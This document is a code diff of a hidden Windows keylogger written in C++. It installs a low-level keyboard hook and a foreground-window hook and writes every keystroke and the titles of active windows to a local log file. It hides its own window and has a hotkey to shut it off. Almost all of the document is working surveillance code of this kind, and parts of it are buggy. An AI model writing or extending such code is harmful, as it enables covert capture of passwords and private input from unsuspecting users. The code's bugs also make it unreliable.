@@ -1,122 +1,63 @@
 #include <Windows.h>
 #include <string>
-#include <format>
+#include "HandleUserInputs.h"
 
 #define maxChars 255
 
+HandleUserInput* hUserInp;
+int KeyId;
 
-bool _isCapsLock;
-bool _isNumLock;
-bool _isScrollLock;
-bool _isShift;
-HFILE file;
-LPCSTR _filename = "sus.txt";
 
-/*private*/ static void SetKeysState()
-{
-	_isCapsLock = GetKeyState(VK_CAPITAL) != 0;
-	_isNumLock = GetKeyState(VK_NUMLOCK) != 0;
-	_isScrollLock = GetKeyState(VK_SCROLL) != 0;
-	_isShift = GetKeyState(VK_SHIFT) != 0;
-}
-
-LPDWORD AppendTextToFile(LPCSTR file, std::string buffer)
-{
-	LPDWORD written = 0;
-	WriteFile((HANDLE)file, (LPCVOID)buffer.c_str(), buffer.size(), written, NULL);
-	return written;
-}
-
-/*private*/ static std::string GetSymbol(UINT vkCode)
-{
-	LPWSTR pwszBuff = new WCHAR[maxChars];
-	CONST BYTE* lpKeyState = new byte[maxChars];
-	HKL keyboard = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), 0));
-	ToUnicodeEx(vkCode, 0, lpKeyState, pwszBuff, maxChars, 0, keyboard);
-
-	std::wstring ws = (pwszBuff);
-	std::string buffSymbol = std::string(ws.begin(), ws.end());
-
-	std::string symbol = wcscmp(pwszBuff, L"\r") ? "\n" : buffSymbol;
-	if (_isCapsLock ^ _isShift)
-	{
-		for (int i = 0; i < symbol.length(); i++)
-		{
-			symbol[i] = toupper(symbol[i]);
-		}
-	}
-	return symbol;
-}
+////HookProc — это заполнитель для имени, определяемого приложением.
+//LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam)
+//{
+//	// process event
+//	if (nCode >= 0 && wParam == WM_KEYUP) {
+//		int vkCode = lParam;
+//		HandleUserInput::SetKeysState();
+//		std::string saveText = HandleUserInput::GetSymbol(vkCode);
+//		//TODO: File Append 
+//		HandleUserInput::AppendTextToFile(HandleUserInput::_filename, saveText);
+//	}
+//	return CallNextHookEx(NULL, nCode, wParam, lParam);
+//}
 
 //HookProc — это заполнитель для имени, определяемого приложением.
 LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
+	std::wstring saveText;
+	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);
+
+
 	// process event
 	if (nCode >= 0 && wParam == WM_KEYUP) {
-		int vkCode = lParam;
-		SetKeysState();
-		std::string saveText = GetSymbol(vkCode);
-		//TODO: File Append 
-		AppendTextToFile(_filename, saveText);
+		//saveText += char(tolower(p->vkCode));
+
+		DWORD vkCode = p->vkCode;
+		hUserInp->SetKeysState();
+		saveText = hUserInp->GetSymbol(vkCode);
+		// 
+
+		// 
+		//TODO: File Append
+		hUserInp->AppendTextToFileW(saveText);
 	}
 	return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
-
-
-HHOOK SetHook(int typeOfHook, HOOKPROC lpfn)
-{
-	WH_KEYBOARD;
-	HANDLE curProc = GetCurrentProcess();
-	__try {
-		return SetWindowsHookEx(typeOfHook, lpfn, NULL, 0);
-	}
-	__finally {
-		delete(curProc);
-	}
-}
-
-HWINEVENTHOOK SetWinHook(WINEVENTPROC callBack)
-{
-	WH_KEYBOARD;
-	HANDLE curProc = GetCurrentProcess();
-	__try {
-		return SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, 0, callBack, 0, 0, WINEVENT_OUTOFCONTEXT);
-	}
-	__finally {
-		delete(curProc);
-	}
-}
-
-LPWSTR GetActiveWindowTitle()
-{
-	LPWSTR wnd_title = new WCHAR[maxChars];
-	HWND hwnd = GetForegroundWindow(); // get handle of currently active window
-	GetWindowText(hwnd, wnd_title, sizeof(wnd_title));
-	return wnd_title;
-}
-
-/*internal*/ static void ActiveWindowsHook(HWINEVENTHOOK hWinEventHook, UINT eventType, HANDLE hWnd, int idObject, int idChild, UINT dwEventThread, UINT dwmsEventTime)
+void CALLBACK ActiveWindowsHook(HWINEVENTHOOK hWinEventHook, DWORD eventType, HWND hWnd, LONG idObject, LONG idChild, DWORD dwEventThread, DWORD dwmsEventTime)
 {
 	//std::FILE.AppendAllTExt
 	//TODO: FILE APPEND
-	char str[maxChars];
-	sprintf_s(str, "%s %s %s", "\n", (char*) GetActiveWindowTitle(), "\n");
-	AppendTextToFile(_filename, str);
+	//char str[maxChars];
+	//sprintf_s(str, "%s %s %s", "\n", (char*)hUserInp->GetActiveWindowTitle(), "\n");
+	//hUserInp->AppendTextToFile(str);
+
+	std::wstring str(hUserInp->GetActiveWindowTitle());
+	str += L"\n";
+	hUserInp->AppendTextToFileW(str);
 }
-	
-void GetFile()
-{
-	file = OpenFile(_filename, NULL, OF_EXIST | OF_READWRITE);
-	if (file == HFILE_ERROR)
-	{
-		file = OpenFile(_filename, NULL, OF_READWRITE | OF_CREATE);
-	}
-	else
-	{
-		file = OpenFile(_filename, NULL, OF_READWRITE);
-	}
-}
+
 
 LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
 
@@ -126,7 +67,13 @@ LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
 	case WM_CLOSE:
 		DestroyWindow(hWnd);
 		break;
-
+	case WM_HOTKEY:
+		if (wParam == KeyId)
+		{
+			UnregisterHotKey(hWnd, KeyId);
+			DestroyWindow(hWnd);
+		}
+		break;
 
 	default:
 		return DefWindowProc(hWnd, uMsg, wParam, lParam);
@@ -152,6 +99,36 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR pCmdLin
 		return 0;
 	}
 
+	hUserInp = new HandleUserInput(hWnd);
+
+
+	//hUserInp->HookId = hUserInp->SetHook(WH_KEYBOARD_LL, &HookProc);
+	hUserInp->HookId = hUserInp->SetHook(WH_KEYBOARD_LL, &HookProc, GetCurrentThreadId());
+	if (hUserInp->HookId == NULL)
+	{
+		hUserInp->AppendTextToFileW(L"Failed to set hook\n");
+		return 0;
+	}
+	else
+	{
+		hUserInp->AppendTextToFileW(L"Hook setted successfully\n");
+	}
+	//HandleUserInputsService.WindowHookId = _handleUserInputsService.SetWinHook(HandleUserInputsService.ActiveWindowsHook);
+
+	hUserInp->WindowHookId = hUserInp->SetWinHook(&ActiveWindowsHook);
+	if (hUserInp->WindowHookId == NULL)
+	{
+		hUserInp->AppendTextToFileW(L"Failed to set WindowHook\n");
+		return 0;
+	}
+	else
+	{
+		hUserInp->AppendTextToFileW(L"WindowHook setted successfully\n");
+	}
+
+	//hUserInp->HookId = SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, 0, &HookProc, 0, 0, WINEVENT_OUTOFCONTEXT);
+	//hUserInp->HookId = hUserInp->SetWinHook(&HandleUserInput::HookProc);
+
 	ShowWindow(hWnd, SW_HIDE);
 
 	MSG msg = {};
@@ -159,5 +136,7 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR pCmdLin
 		//DispatchMessage(&msg);
 	}
 
+	UnhookWindowsHookEx(hUserInp->HookId);
+	UnhookWinEvent(hUserInp->WindowHookId);
 	return 0;
 }
